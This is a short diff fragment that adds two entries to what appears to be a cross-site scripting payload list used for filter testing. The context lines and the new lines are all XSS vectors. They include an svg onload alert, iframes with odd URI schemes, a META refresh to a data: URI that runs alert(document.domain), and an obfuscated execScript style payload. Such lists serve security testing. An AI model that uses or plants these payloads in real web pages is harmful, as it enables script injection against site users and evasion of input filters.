@@ -1131,4 +1131,6 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <iframe src="calculator:">
 1"--></script><svg/onload=';alert(0);'>
 <iframe src="ms-appx-web://microsoft.windows.spartan/%2e%2e%2f%2e%2e%2fTemp/blah.txt">
+<META http-equiv="refresh" content="1;URL=data:text/html,<script>alert(document.domain)</script>">
+<style onload='execScript(/**/"\x61lert&#40 1&#41","j\x61vascript");'>
 /* RFI STOP */
